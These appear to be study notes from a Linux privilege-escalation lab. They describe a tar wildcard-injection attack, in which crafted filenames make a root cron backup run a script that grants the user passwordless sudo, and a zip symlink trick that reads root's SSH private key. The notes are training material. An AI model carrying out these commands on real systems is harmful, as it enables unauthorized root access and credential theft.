- some characters can be used as a replacement for other characters and the shell will interpret those as valid.

**EXAMPLE**
## TAR file attacks
- `tar` command that creates/extracts archives
	- it takes a command line arg in `--checkpoint-action=arg`
- **Scenario**
	- We have a cron job that backs up the home folder every minute
	- ![](/attachments/Pasted-image-20250920084916.png)
		- `*` will be replaced by all the file names in the folder
	- we can use it to write commands as file names. when the cronjob runs, these filenames will be interpreted & executed as commands 
```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

<hr>

## ZIP file attack - symlink
```
# Create malicious zip with symlink to root file
ln -s /root/.ssh/id_rsa rootkey
zip --symlinks exploit.zip rootkey

# When extracted by root process, reads /root/.ssh/id_rsa
```
